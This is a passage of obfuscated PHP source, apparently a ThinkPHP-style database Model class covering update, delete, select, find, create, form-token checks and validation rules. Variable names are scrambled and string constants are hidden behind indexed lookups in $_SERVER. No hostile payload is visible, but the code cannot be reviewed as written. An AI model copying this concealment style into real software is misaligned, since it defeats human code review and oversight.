$ö†˝˜µû = $this->_parseOptions($ö†˝˜µû); $Äæ∞ÚÇñ = $this->getPk(); if (!isset($ö†˝˜µû[$ïıËØÍ≤[279]])) { if (isset($√”˛œº›[$Äæ∞ÚÇñ])) { $º‹‘∂›Á[$Äæ∞ÚÇñ] = $√”˛œº›[$Äæ∞ÚÇñ]; $ö†˝˜µû[$ïıËØÍ≤[279]] = $º‹‘∂›Á; unset($√”˛œº›[$Äæ∞ÚÇñ]); } else { $this->error = think_lang($ïıËØÍ≤[278]); return !1; } } if (is_array($ö†˝˜µû[$ïıËØÍ≤[279]]) && isset($ö†˝˜µû[$ïıËØÍ≤[279]][$Äæ∞ÚÇñ])) { $ò˚ÍÏ≈† = $ö†˝˜µû[$ïıËØÍ≤[279]][$Äæ∞ÚÇñ]; } if (!1 === $this->_beforeUpdate($√”˛œº›, $ö†˝˜µû)) { return !1; } $Â√‹Ùÿ‘ = $this->db->update($√”˛œº›, $ö†˝˜µû); if (!1 !== $Â√‹Ùÿ‘) { if (isset($ò˚ÍÏ≈†)) { $√”˛œº›[$Äæ∞ÚÇñ] = $ò˚ÍÏ≈†; } $this->_afterUpdate($√”˛œº›, $ö†˝˜µû); } return $Â√‹Ùÿ‘; } protected function _beforeUpdate(&$¢˛õ¶Ñ, $Ü˝«á—Å) { } protected function _afterUpdate($™⁄’¬∆È, $ÏÕÈë°) { } public function delete($çºªËì≠ = array()) { $¢˜Û∏¨¿ =& $_SERVER[ëæªã÷]; if (empty($çºªËì≠) && empty($this->options[$¢˜Û∏¨¿[279]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ê„…’Å® = $this->getPk(); if (is_numeric($çºªËì≠) || is_string($çºªËì≠)) { if (strpos($çºªËì≠, $¢˜Û∏¨¿[50])) { $Ïå•ç¬¸[$ê„…’Å®] = array($¢˜Û∏¨¿[280], $çºªËì≠); } else { $Ïå•ç¬¸[$ê„…’Å®] = $çºªËì≠; } $this->options[$¢˜Û∏¨¿[279]] = $Ïå•ç¬¸; } $çºªËì≠ = $this->_parseOptions(); if (is_array($çºªËì≠[$¢˜Û∏¨¿[279]]) && isset($çºªËì≠[$¢˜Û∏¨¿[279]][$ê„…’Å®])) { $ë˘í≠ÈÕ = $çºªËì≠[$¢˜Û∏¨¿[279]][$ê„…’Å®]; } $ö∫°º˛Á = $this->db->delete($çºªËì≠); if (!1 !== $ö∫°º˛Á) { $Ÿ…¢¯ÅÙ = array(); if (isset($ë˘í≠ÈÕ)) { $Ÿ…¢¯ÅÙ[$ê„…’Å®] = $ë˘í≠ÈÕ; } $this->_after_delete($Ÿ…¢¯ÅÙ, $çºªËì≠); } return $ö∫°º˛Á; } protected function _after_delete($’ÀÃﬁéû, $îÜì…·ï) { } public function select($ªúöãÜÒ = array()) { $Îª°¡∫å =& $_SERVER[ëæªã÷]; if (is_string($ªúöãÜÒ) || is_numeric($ªúöãÜÒ)) { $«îÒôÂ = $this->getPk(); if (strpos($ªúöãÜÒ, $Îª°¡∫å[50])) { $…€Äπ∆Ô[$«îÒôÂ] = array($Îª°¡∫å[280], $ªúöãÜÒ); } else { $…€Äπ∆Ô[$«îÒôÂ] = $ªúöãÜÒ; } $this->options[$Îª°¡∫å[279]] = $…€Äπ∆Ô; } elseif (!1 === $ªúöãÜÒ) { $ªúöãÜÒ = $this->_parseOptions(); return $Îª°¡∫å[281] . $this->db->buildSelectSql($ªúöãÜÒ) . $Îª°¡∫å[282]; } $ªúöãÜÒ = $this->_parseOptions(); $”Ò≈ÿ”Ç = $this->db->select($ªúöãÜÒ); if (!1 === $”Ò≈ÿ”Ç) { return !1; } if (empty($”Ò≈ÿ”Ç)) { return null; } $this->_afterSelect($”Ò≈ÿ”Ç, $ªúöãÜÒ); return $”Ò≈ÿ”Ç; } protected function _afterSelect(&$Ç·ﬁè±’, $üÌ¨¸˝π) { } public function buildSql($ﬁÅåπÏ∞ = array()) { $àäÁ√ﬁæ =& $_SERVER[ëæªã÷]; $ﬁÅåπÏ∞ = $this->_parseOptions($ﬁÅåπÏ∞); return $àäÁ√ﬁæ[281] . $this->db->buildSelectSql($ﬁÅåπÏ∞) . $àäÁ√ﬁæ[282]; } public function optionsValue($±ÊËÀ√≤ = null) { if (is_null($±ÊËÀ√≤)) { return $this->options; } elseif (is_array($±ÊËÀ√≤)) { $this->options = array_merge($this->options, $±ÊËÀ√≤); } } protected function _parseOptions($¿ÌÁ„Òè = array()) { $º¶œ∑ƒ˝ =& $_SERVER[ëæªã÷]; if (is_array($¿ÌÁ„Òè)) { $¿ÌÁ„Òè = array_merge($this->options, $¿ÌÁ„Òè); } $this->options = array(); if (!isset($¿ÌÁ„Òè[$º¶œ∑ƒ˝[283]])) { $¿ÌÁ„Òè[$º¶œ∑ƒ˝[283]] = $this->getTableName(); $Ôπ´Ÿ√Ï = $this->fields; } else { $Ôπ´Ÿ√Ï = $this->getDbFields(); } if (!empty($¿ÌÁ„Òè[$º¶œ∑ƒ˝[284]])) { $¿ÌÁ„Òè[$º¶œ∑ƒ˝[283]] .= $º¶œ∑ƒ˝[53] . $¿ÌÁ„Òè[$º¶œ∑ƒ˝[284]]; } $¿ÌÁ„Òè[$º¶œ∑ƒ˝[285]] = $this->name; if (isset($¿ÌÁ„Òè[$º¶œ∑ƒ˝[279]]) && is_array($¿ÌÁ„Òè[$º¶œ∑ƒ˝[279]]) && !empty($Ôπ´Ÿ√Ï) && !isset($¿ÌÁ„Òè[$º¶œ∑ƒ˝[286]]) && !isset($¿ÌÁ„Òè[$º¶œ∑ƒ˝[283]])) { foreach ($¿ÌÁ„Òè[$º¶œ∑ƒ˝[279]] as $áôŒ∫‹Ê => $‹ ≤º§≥) { $áôŒ∫‹Ê = trim($áôŒ∫‹Ê); if (in_array($áôŒ∫‹Ê, $Ôπ´Ÿ√Ï, !0)) { if (is_scalar($‹ ≤º§≥)) { $this->_parseType($¿ÌÁ„Òè[$º¶œ∑ƒ˝[279]], $áôŒ∫‹Ê); } } elseif (!is_numeric($áôŒ∫‹Ê) && $º¶œ∑ƒ˝[11] != substr($áôŒ∫‹Ê, 0, 1) && !1 === strpos($áôŒ∫‹Ê, $º¶œ∑ƒ˝[10]) && !1 === strpos($áôŒ∫‹Ê, $º¶œ∑ƒ˝[264]) && !1 === strpos($áôŒ∫‹Ê, $º¶œ∑ƒ˝[287]) && !1 === strpos($áôŒ∫‹Ê, $º¶œ∑ƒ˝[288])) { unset($¿ÌÁ„Òè[$º¶œ∑ƒ˝[279]][$áôŒ∫‹Ê]); } } } $this->_options_filter($¿ÌÁ„Òè); return $¿ÌÁ„Òè; } protected function _options_filter(&$éê–§‰™) { } protected function _parseType(&$ó„ﬂà†√, $˝à≠àÏú) { $Ï¡”øƒ¯ =& $_SERVER[ëæªã÷]; if (empty($this->options[$Ï¡”øƒ¯[289]][$Ï¡”øƒ¯[4] . $˝à≠àÏú])) { $®˝È‰ªö = strtolower($this->fields[$Ï¡”øƒ¯[256]][$˝à≠àÏú]); if (!1 !== strpos($®˝È‰ªö, $Ï¡”øƒ¯[290])) { } elseif (!1 === strpos($®˝È‰ªö, $Ï¡”øƒ¯[291]) && !1 !== strpos($®˝È‰ªö, $Ï¡”øƒ¯[292])) { $ó„ﬂà†√[$˝à≠àÏú] = intval($ó„ﬂà†√[$˝à≠àÏú]); } elseif (!1 !== strpos($®˝È‰ªö, $Ï¡”øƒ¯[293]) || !1 !== strpos($®˝È‰ªö, $Ï¡”øƒ¯[294])) { $ó„ﬂà†√[$˝à≠àÏú] = floatval($ó„ﬂà†√[$˝à≠àÏú]); } elseif (!1 !== strpos($®˝È‰ªö, $Ï¡”øƒ¯[295])) { $ó„ﬂà†√[$˝à≠àÏú] = (bool) $ó„ﬂà†√[$˝à≠àÏú]; } } } public function find($Ê≥∞–¸Ω = array()) { $òªªˆÖﬂ =& $_SERVER[ëæªã÷]; if (is_numeric($Ê≥∞–¸Ω) || is_string($Ê≥∞–¸Ω)) { $≥§Äµæ¥[$this->getPk()] = intval($Ê≥∞–¸Ω); $this->options[$òªªˆÖﬂ[279]] = $≥§Äµæ¥; } $this->options[$òªªˆÖﬂ[296]] = 1; $Ê≥∞–¸Ω = $this->_parseOptions(); $¨í’˘ë® = $this->db->select($Ê≥∞–¸Ω); if (!1 === $¨í’˘ë®) { return !1; } if (empty($¨í’˘ë®)) { return null; } $this->data = $¨í’˘ë®[0]; $this->_afterFind($this->data, $Ê≥∞–¸Ω); if (!empty($this->options[$òªªˆÖﬂ[297]])) { return $this->returnResult($this->data, $this->options[$òªªˆÖﬂ[297]]); } return $this->data; } protected function _afterFind(&$óÙâîæ¡, $ÈƒÍﬁ¸≤) { } protected function returnResult($≈ÂÉ˙‘œ, $–∞ö†πº = '') { $œî”÷á˛ =& $_SERVER[ëæªã÷]; if ($–∞ö†πº) { if (is_callable($–∞ö†πº)) { return call_user_func($–∞ö†πº, $≈ÂÉ˙‘œ); } switch (strtolower($–∞ö†πº)) { case $œî”÷á˛[298]: return json_encode($≈ÂÉ˙‘œ); case $œî”÷á˛[299]: return xml_encode($≈ÂÉ˙‘œ); } } return $≈ÂÉ˙‘œ; } public function parseFieldsMap($ü˚Ç…§√, $⁄òúúÍ∑ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $÷Ç∫ÓÆÌ => $√ß†ëè) { if ($⁄òúúÍ∑ == 1) { if (isset($ü˚Ç…§√[$√ß†ëè])) { $ü˚Ç…§√[$÷Ç∫ÓÆÌ] = $ü˚Ç…§√[$√ß†ëè]; unset($ü˚Ç…§√[$√ß†ëè]); } } else { if (isset($ü˚Ç…§√[$÷Ç∫ÓÆÌ])) { $ü˚Ç…§√[$√ß†ëè] = $ü˚Ç…§√[$÷Ç∫ÓÆÌ]; unset($ü˚Ç…§√[$÷Ç∫ÓÆÌ]); } } } } return $ü˚Ç…§√; } public function setField($Ê≥é∑ßÎ, $Ì®µ¬êÉ = '') { if (is_array($Ê≥é∑ßÎ)) { $©Âú‹—≤ = $Ê≥é∑ßÎ; } else { $©Âú‹—≤[$Ê≥é∑ßÎ] = $Ì®µ¬êÉ; } return $this->save($©Âú‹—≤); } public function setAdd($¢©ÕÇîò, $ƒùì…¨√ = 1) { $ÖÓà˘®Ñ =& $_SERVER[ëæªã÷]; $“˚…Å“Å = $¢©ÕÇîò . $ÖÓà˘®Ñ[300] . $ƒùì…¨√; if ($ƒùì…¨√ < 0) { $“˚…Å“Å = $¢©ÕÇîò . $ƒùì…¨√; } return $this->setField($¢©ÕÇîò, array($ÖÓà˘®Ñ[301], $“˚…Å“Å)); } public function getField($è∏ÚŒ˝Ì, $âç≥¬ªÿ = null) { $‹ÉΩÂ∏˜ =& $_SERVER[ëæªã÷]; $¢Ô‡€õ‡[$‹ÉΩÂ∏˜[277]] = $è∏ÚŒ˝Ì; $¢Ô‡€õ‡ = $this->_parseOptions($¢Ô‡€õ‡); $è∏ÚŒ˝Ì = trim($è∏ÚŒ˝Ì); if (strpos($è∏ÚŒ˝Ì, $‹ÉΩÂ∏˜[50])) { if (!isset($¢Ô‡€õ‡[$‹ÉΩÂ∏˜[296]])) { $¢Ô‡€õ‡[$‹ÉΩÂ∏˜[296]] = is_numeric($âç≥¬ªÿ) ? $âç≥¬ªÿ : $‹ÉΩÂ∏˜[12]; } $ÆŒâ‚°¸ = $this->db->select($¢Ô‡€õ‡); if (!empty($ÆŒâ‚°¸)) { $Ï°Å¡  = explode($‹ÉΩÂ∏˜[50], $è∏ÚŒ˝Ì); $è∏ÚŒ˝Ì = array_keys($ÆŒâ‚°¸[0]); $ÓΩ˚⁄é∫ = array_shift($è∏ÚŒ˝Ì); $Ûπñ™ﬂ≈ = array_shift($è∏ÚŒ˝Ì); $¯‹“ÔéÚ = array(); $•⁄çá¯á = count($Ï°Å¡ ); foreach ($ÆŒâ‚°¸ as $≠ñﬁ±‰†) { $ÕÈ˛‚∫± = $≠ñﬁ±‰†[$ÓΩ˚⁄é∫]; if (2 == $•⁄çá¯á) { $¯‹“ÔéÚ[$ÕÈ˛‚∫±] = $≠ñﬁ±‰†[$Ûπñ™ﬂ≈]; } else { $¯‹“ÔéÚ[$ÕÈ˛‚∫±] = is_string($âç≥¬ªÿ) ? implode($âç≥¬ªÿ, $≠ñﬁ±‰†) : $≠ñﬁ±‰†; } } return $¯‹“ÔéÚ; } } else { if (!0 !== $âç≥¬ªÿ) { $¢Ô‡€õ‡[$‹ÉΩÂ∏˜[296]] = is_numeric($âç≥¬ªÿ) ? $âç≥¬ªÿ : 1; } if ($âç≥¬ªÿ === $‹ÉΩÂ∏˜[259]) { unset($¢Ô‡€õ‡[$‹ÉΩÂ∏˜[296]]); } $≠ñﬁ±‰† = $this->db->select($¢Ô‡€õ‡); if (!empty($≠ñﬁ±‰†)) { if ($âç≥¬ªÿ === $‹ÉΩÂ∏˜[259]) { return reset($≠ñﬁ±‰†[0]); } if (!0 !== $âç≥¬ªÿ && 1 == $¢Ô‡€õ‡[$‹ÉΩÂ∏˜[296]]) { return reset($≠ñﬁ±‰†[0]); } foreach ($≠ñﬁ±‰† as $˘›Ùçº±) { $Û¡√§Ö¯[] = $˘›Ùçº±[$è∏ÚŒ˝Ì]; } return $Û¡√§Ö¯; } } return null; } public function create($Çœ¥Ëõ∫ = '', $¨≥îÏÌá = '') { $Ò¬ﬁô¸œ =& $_SERVER[ëæªã÷]; if (empty($Çœ¥Ëõ∫)) { $Çœ¥Ëõ∫ = $_POST; } elseif (is_object($Çœ¥Ëõ∫)) { $Çœ¥Ëõ∫ = get_object_vars($Çœ¥Ëõ∫); } if (empty($Çœ¥Ëõ∫) || !is_array($Çœ¥Ëõ∫)) { $this->error = think_lang($Ò¬ﬁô¸œ[275]); return !1; } $Çœ¥Ëõ∫ = $this->parseFieldsMap($Çœ¥Ëõ∫, 0); $¨≥îÏÌá = $¨≥îÏÌá ? $¨≥îÏÌá : (!empty($Çœ¥Ëõ∫[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ò¬ﬁô¸œ[277]])) { $«ÔÜ¬Û° = $this->options[$Ò¬ﬁô¸œ[277]]; unset($this->options[$Ò¬ﬁô¸œ[277]]); } elseif ($¨≥îÏÌá == THINK_MODEL_INSERT && isset($this->insertFields)) { $«ÔÜ¬Û° = $this->insertFields; } elseif ($¨≥îÏÌá == THINK_MODEL_UPDATE && isset($this->updateFields)) { $«ÔÜ¬Û° = $this->updateFields; } if (isset($«ÔÜ¬Û°)) { if (is_string($«ÔÜ¬Û°)) { $«ÔÜ¬Û° = explode($Ò¬ﬁô¸œ[50], $«ÔÜ¬Û°); } if (think_config($Ò¬ﬁô¸œ[302])) { $«ÔÜ¬Û°[] = think_config($Ò¬ﬁô¸œ[303]); } foreach ($Çœ¥Ëõ∫ as $çòô¥˝Á => $À©ëŒÚÌ) { if (!in_array($çòô¥˝Á, $«ÔÜ¬Û°)) { unset($Çœ¥Ëõ∫[$çòô¥˝Á]); } } } if (!$this->autoValidation($Çœ¥Ëõ∫, $¨≥îÏÌá)) { return !1; } if (!$this->autoCheckToken($Çœ¥Ëõ∫)) { $this->error = think_lang($Ò¬ﬁô¸œ[304]); return !1; } if ($this->autoCheckFields) { $«ÔÜ¬Û° = $this->getDbFields(); foreach ($Çœ¥Ëõ∫ as $çòô¥˝Á => $À©ëŒÚÌ) { if (!in_array($çòô¥˝Á, $«ÔÜ¬Û°)) { unset($Çœ¥Ëõ∫[$çòô¥˝Á]); } elseif (MAGIC_QUOTES_GPC && is_string($À©ëŒÚÌ)) { $Çœ¥Ëõ∫[$çòô¥˝Á] = stripslashes($À©ëŒÚÌ); } } } $this->autoOperation($Çœ¥Ëõ∫, $¨≥îÏÌá); $this->data = $Çœ¥Ëõ∫; return $Çœ¥Ëõ∫; } public function autoCheckToken($©“Å¿∆¨) { $«ûÖÿñ÷ =& $_SERVER[ëæªã÷]; if (isset($this->options[$«ûÖÿñ÷[305]]) && !$this->options[$«ûÖÿñ÷[305]]) { return !0; } if (think_config($«ûÖÿñ÷[302])) { $≥€∏˛≤Ê = think_config($«ûÖÿñ÷[303]); if (!isset($©“Å¿∆¨[$≥€∏˛≤Ê]) || Session::get($≥€∏˛≤Ê)) { return !1; } list($ú∫€ù˜“, $»’°°éÚ) = explode($«ûÖÿñ÷[11], $©“Å¿∆¨[$≥€∏˛≤Ê]); if ($»’°°éÚ && Session::get($≥€∏˛≤Ê . $«ûÖÿñ÷[10] . $ú∫€ù˜“) === $»’°°éÚ) { Session::remove($≥€∏˛≤Ê . $«ûÖÿñ÷[10] . $ú∫€ù˜“); return !0; } if (think_config($«ûÖÿñ÷[306])) { Session::remove($≥€∏˛≤Ê . $«ûÖÿñ÷[10] . $ú∫€ù˜“); } return !1; } return !0; } public function regex($‡±«∆»Ë, $™ª«ÑØ¿) { $Ôï˘Ç”Ë =& $_SERVER[ëæªã÷]; $π‡’¯Üú = array($Ôï˘Ç”Ë[307] => $Ôï˘Ç”Ë[308], $Ôï˘Ç”Ë[309] => $Ôï˘Ç”Ë[310], $Ôï˘Ç”Ë[311] => $Ôï˘Ç”Ë[312], $Ôï˘Ç”Ë[313] => $Ôï˘Ç”Ë[314], $Ôï˘Ç”Ë[315] => $Ôï˘Ç”Ë[316], $Ôï˘Ç”Ë[317] => $Ôï˘Ç”Ë[318], $Ôï˘Ç”Ë[319] => $Ôï˘Ç”Ë[320], $Ôï˘Ç”Ë[294] => $Ôï˘Ç”Ë[321], $Ôï˘Ç”Ë[322] => $Ôï˘Ç”Ë[323]); if (isset($π‡’¯Üú[strtolower($™ª«ÑØ¿)])) { $™ª«ÑØ¿ = $π‡’¯Üú[strtolower($™ª«ÑØ¿)]; } return preg_match($™ª«ÑØ¿, $‡±«∆»Ë) === 1; } private function autoOperation(&$î•√Õ∞÷, $íá¶∑‡¢) { $ì˛Ì‰äÚ =& $_SERVER[ëæªã÷]; if (!empty($this->options[$ì˛Ì‰äÚ[324]])) { $ùï‚≥¿Å = $this->options[$ì˛Ì‰äÚ[324]]; unset($this->options[$ì˛Ì‰äÚ[324]]); } elseif (!empty($this->_auto)) { $ùï‚≥¿Å = $this->_auto; } if (isset($ùï‚≥¿Å)) { foreach ($ùï‚≥¿Å as $Õ¢‹≠õÚ) { if (empty($Õ¢‹≠õÚ[2])) { $Õ¢‹≠õÚ[2] = THINK_MODEL_INSERT; } if ($íá¶∑‡¢ == $Õ¢‹≠õÚ[2] || $Õ¢‹≠õÚ[2] == THINK_MODEL_BOTH) { switch (trim($Õ¢‹≠õÚ[3])) { case $ì˛Ì‰äÚ[325]: case $ì˛Ì‰äÚ[326]: $ÖêÊ˙’≠ = isset($Õ¢‹≠õÚ[4]) ? (array) $Õ¢‹≠õÚ[4] : array(); if (isset($î•√Õ∞÷[$Õ¢‹≠õÚ[0]])) { array_unshift($ÖêÊ˙’≠, $î•√Õ∞÷[$Õ¢‹≠õÚ[0]]); } if ($ì˛Ì‰äÚ[325] == $Õ¢‹≠õÚ[3]) { $î•√Õ∞÷[$Õ¢‹≠õÚ[0]] = call_user_func_array($Õ¢‹≠õÚ[1], $ÖêÊ˙’≠); } else { $î•√Õ∞÷[$Õ¢‹≠õÚ[0]] = call_user_func_array(array(&$this, $Õ¢‹≠õÚ[1]), $ÖêÊ˙’≠); } break; case $ì˛Ì‰äÚ[277]: $î•√Õ∞÷[$Õ¢‹≠õÚ[0]] = $î•√Õ∞÷[$Õ¢‹≠õÚ[1]]; break; case $ì˛Ì‰äÚ[327]: if ($ì˛Ì‰äÚ[12] === $î•√Õ∞÷[$Õ¢‹≠õÚ[0]]) { unset($î•√Õ∞÷[$Õ¢‹≠õÚ[0]]); } break; case $ì˛Ì‰äÚ[328]: default: $î•√Õ∞÷[$Õ¢‹≠õÚ[0]] = $Õ¢‹≠õÚ[1]; } if (!1 === $î•√Õ∞÷[$Õ¢‹≠õÚ[0]]) { unset($î•√Õ∞÷[$Õ¢‹≠õÚ[0]]); } } } } return $î•√Õ∞÷; } protected function autoValidation($Å«¸˜∆ÿ, $äÌá¶∑˝) { $∏øÇèÉÖ =& $_SERVER[ëæªã÷]; if (!empty($this->options[$∏øÇèÉÖ[329]])) { $∫É£Ô√∆ = $this->options[$∏øÇèÉÖ[329]]; unset($this->options[$∏øÇèÉÖ[329]]); } elseif (!empty($this->_validate)) { $∫É£Ô√∆ = $this->_validate; } if (isset($∫É£Ô√∆)) { if ($this->patchValidate) { $this->error = array(); } foreach ($∫É£Ô√∆ as $é’ÀËò˚ => $∫’ö«©∫) { if (empty($∫’ö«©∫[5]) || $∫’ö«©∫[5] == THINK_MODEL_BOTH || $∫’ö«©∫[5] == $äÌá¶∑˝) { if (0 == strpos($∫’ö«©∫[2], $∏øÇèÉÖ[330]) && strpos($∫’ö«©∫[2], $∏øÇèÉÖ[331])) { $∫’ö«©∫[2] = think_lang(substr($∫’ö«©∫[2], 2, -1)); } $∫’ö«©∫[3] = isset($∫’ö«©∫[3]) ? $∫’ö«©∫[3] : THINK_EXISTS_VALIDATE; $∫’ö«©∫[4] = isset($∫’ö«©∫[4]) ? $∫’ö«©∫[4] : $∏øÇèÉÖ[332]; switch ($∫’ö«©∫[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Å«¸˜∆ÿ, $∫’ö«©∫)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($∏øÇèÉÖ[12] != trim($Å«¸˜∆ÿ[$∫’ö«©∫[0]])) { if (!1 === $this->_validationField($Å«¸˜∆ÿ, $∫’ö«©∫)) { return !1; } } break; default: if (isset($Å«¸˜∆ÿ[$∫’ö«©∫[0]])) { if (!1 === $this->_validationField($Å«¸˜∆ÿ, $∫’ö«©∫)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÆÊÓßﬂ , $øÈæËíÿ) { if (!1 === $this->_validationFieldItem($ÆÊÓßﬂ , $øÈæËíÿ)) { if ($this->patchValidate) { $this->error[$øÈæËíÿ[0]] = $øÈæËíÿ[2]; } else { $this->error = $øÈæËíÿ[2]; return !1; } } return; } protected function _validationFieldItem($œûìÕûÊ, $ªˆÂç§) { $ ÷˛Ñ˙ä =& $_SERVER[ëæªã÷]; switch (strtolower(trim($ªˆÂç§[4]))) { case $ ÷˛Ñ˙ä[325]: case $ ÷˛Ñ˙ä[326]: $µùò˝¯« = isset($ªˆÂç§[6]) ? (array) $ªˆÂç§[6] : array(); if (is_string($ªˆÂç§[0]) && strpos($ªˆÂç§[0], $ ÷˛Ñ˙ä[50])) { $ªˆÂç§[0] = explode($ ÷˛Ñ˙ä[50], $ªˆÂç§[0]); } if (is_array($ªˆÂç§[0])) { foreach ($ªˆÂç§[0] as $‚±¬‘ÈÄ) { $à∑á¥Ù∂[$‚±¬‘ÈÄ] = $œûìÕûÊ[$‚±¬‘ÈÄ]; } array_unshift($µùò˝¯«, $à∑á¥Ù∂); } else { array_unshift($µùò˝¯«, $œûìÕûÊ[$ªˆÂç§[0]]); } if ($ ÷˛Ñ˙ä[325] == $ªˆÂç§[4]) { return call_user_func_array($ªˆÂç§[1], $µùò˝¯«); } else { return call_user_func_array(array(&$this, $ªˆÂç§[1]), $µùò˝¯«); } case $ ÷˛Ñ˙ä[333]: return $œûìÕûÊ[$ªˆÂç§[0]] == $œûìÕûÊ[$ªˆÂç§[1]]; case $ ÷˛Ñ˙ä[334]: if (is_string($ªˆÂç§[0]) && strpos($ªˆÂç§[0], $ ÷˛Ñ˙ä[50])) { $ªˆÂç§[0] = explode($ ÷˛Ñ˙ä[50], $ªˆÂç§[0]); } $ü¨¬ú®¯ = array(); if (is_array($ªˆÂç§[0])) { foreach ($ªˆÂç§[0] as $‚±¬‘ÈÄ) { $ü¨¬ú®¯[$‚±¬‘ÈÄ] = $œûìÕûÊ[$‚±¬‘ÈÄ]; } } else { $ü¨¬ú®¯[$ªˆÂç§[0]] = $œûìÕûÊ[$ªˆÂç§[0]]; } if (!empty($œûìÕûÊ[$this->getPk()])) { $ü¨¬ú®¯[$this->getPk()] = array($ ÷˛Ñ˙ä[335], $œûìÕûÊ[$this->getPk()]); } if ($this->where($ü¨¬ú®¯)->find()) { return !1; } return !0; default: return $this->check($œûìÕûÊ[$ªˆÂç§[0]], $ªˆÂç§[1], $ªˆÂç§[4]); } } public function check($ªä˜πûÑ, $£ÿëçœ‘, $”È“··∂ = "\162\x65\x67\145\x78") { $Ö•¥Èﬂü =& $_SERVER[ëæªã÷]; $”È“··∂ = strtolower(trim($”È“··∂)); switch ($”È“··∂) { case $Ö•¥Èﬂü[7]: case $Ö•¥Èﬂü[336]: $Ÿ…£é‡‘ = is_array($£ÿëçœ‘) ? $£ÿëçœ‘ : explode($Ö•¥Èﬂü[50], $£ÿëçœ‘); return $”È“··∂ == $Ö•¥Èﬂü[7] ? in_array($ªä˜πûÑ, $Ÿ…£é‡‘) : !in_array($ªä˜πûÑ, $Ÿ…£é‡‘); case $Ö•¥Èﬂü[337]: case $Ö•¥Èﬂü[338]: if (is_array($£ÿëçœ‘)) { $∏§¥∫∑Ä = $£ÿëçœ‘[0]; $º†ÁŒ¿Ë = $£ÿëçœ‘[1]; } else { list($∏§¥∫∑Ä, $º†ÁŒ¿Ë) = explode($Ö•¥Èﬂü[50], $£ÿëçœ‘); } return $”È“··∂ == $Ö•¥Èﬂü[337] ? $ªä˜πûÑ >= $∏§¥∫∑Ä && $ªä˜πûÑ <= $º†ÁŒ¿Ë : $ªä˜πûÑ < $∏§¥∫∑Ä || $ªä˜πûÑ > $º†ÁŒ¿Ë; case $Ö•¥Èﬂü[339]: case $Ö•¥Èﬂü[340]: return $”È“··∂ == $Ö•¥Èﬂü[339] ? $ªä˜πûÑ == $£ÿëçœ‘ : $ªä˜πûÑ != $£ÿëçœ‘; case $Ö•¥Èﬂü[341]: $˙ù¨‘Æª = mb_strlen($ªä˜πûÑ, $Ö•¥Èﬂü[342]); if (strpos($£ÿëçœ‘, $Ö•¥Èﬂü[50])) { list($∏§¥∫∑Ä, $º†ÁŒ¿Ë) = explode($Ö•¥Èﬂü[50], $£ÿëçœ‘); return $˙ù¨‘Æª >= $∏§¥∫∑Ä && $˙ù¨‘Æª <= $º†ÁŒ¿Ë; } else { return $˙ù¨‘Æª == $£ÿëçœ‘; } case $Ö•¥Èﬂü[343]: list($≥Æø©˚í, $ÏåﬂÄòá) = explode($Ö•¥Èﬂü[50], $£ÿëçœ‘); if (!is_numeric($≥Æø©˚í)) { $≥Æø©˚í = strtotime($≥Æø©˚í); } if (!is_numeric($ÏåﬂÄòá)) { $ÏåﬂÄòá = strtotime($ÏåﬂÄòá); } return NOW_TIME >= $≥Æø©˚í && NOW_TIME <= $ÏåﬂÄòá; case $Ö•¥Èﬂü[344]: return in_array(get_client_ip(), explode($Ö•¥Èﬂü[50], $£ÿëçœ‘)); case $Ö•¥Èﬂü[345]: return !in_array(get_client_ip(), explode($Ö•¥Èﬂü[50], $£ÿëçœ‘)); case $Ö•¥Èﬂü[332]: default: return $this->regex($ªä˜πûÑ, $£ÿëçœ‘); } } public function query($¨¸ù–€Ü, $Ö√˙Ó˘— = false) { $“©‰∂˚ =& $_SERVER[ëæªã÷]; if (!is_bool($Ö√˙Ó˘—) && !is_array($Ö√˙Ó˘—)) { $Ö√˙Ó˘— = func_get_args(); array_shift($Ö√˙Ó˘—); } $¨¸ù–€Ü = str_replace(array($“©‰∂˚[65], $“©‰∂˚[346]), $“©‰∂˚[53], $¨¸ù–€Ü); $¨¸ù–€Ü = $this->parseSql($¨¸ù–€Ü, $Ö√˙Ó˘—); return $this->db->query($¨¸ù–€Ü); } public function execute($»è¥ ÚÒ, $Ö„ú¨¢Å = false) { if (!is_bool($Ö„ú¨¢Å) && !is_array($Ö„ú¨¢Å)) { $Ö„ú¨¢Å = func_get_args(); array_shift($Ö„ú¨¢Å); } $»è¥ ÚÒ = $this->parseSql($»è¥ ÚÒ, $Ö„ú¨¢Å); return $this->db->execute($»è¥ ÚÒ); } protected function parseSql($ëàÿœ„™, $í·∫“®µ) { $òÅ‘¨Ù¨ =& $_SERVER[ëæªã÷]; if (!0 === $í·∫“®µ) { $Â“Ö¿”ú = $this->_parseOptions(); $ëàÿœ„™ = $this->db->parseSql($ëàÿœ„™, $Â“Ö¿”ú); } elseif (is_array($í·∫“®µ)) { $í·∫“®µ = array_map(array($this->db, $òÅ‘¨Ù¨[347]), $í·∫“®µ); $ëàÿœ„™ = vsprintf($ëàÿœ„™, $í·∫“®µ); } else { $ëàÿœ„™ = strtr($ëàÿœ„™, array($òÅ‘¨Ù¨[348] => $this->getTableName(), $òÅ‘¨Ù¨[349] => think_config($òÅ‘¨Ù¨[248]))); } $this->db->setModel($this->name); return $ëàÿœ„™; } public function db($ô™∂¥‚¬ = '', $ÎÈøÉ˝ = '', $ÙÎÒﬁÑ† = array()) { $†à‡¨¡¶ =& $_SERVER[ëæªã÷]; if ($†à‡¨¡¶[12] === $ô™∂¥‚¬ && $this->db) { return $this->db; } static $ÍØ¸√÷è = array(); static $∏‰◊øŸó = array(); if (!isset($∏‰◊øŸó[$ô™∂¥‚¬]) || isset($∏‰◊øŸó[$ô™∂¥‚¬]) && $ÎÈøÉ˝ && $ÍØ¸√÷è[$ô™∂¥‚¬] != $ÎÈøÉ˝) { if (!empty($ÎÈøÉ˝) && is_string($ÎÈøÉ˝) && !1 === strpos($ÎÈøÉ˝, $†à‡¨¡¶[8])) { $ÎÈøÉ˝ = think_config($ÎÈøÉ˝); } $ô™∂¥‚¬ = think_guid($ÎÈøÉ˝); $∏‰◊øŸó[$ô™∂¥‚¬] = Db::getInstance($ÎÈøÉ˝); } elseif (NULL === $ÎÈøÉ˝) { 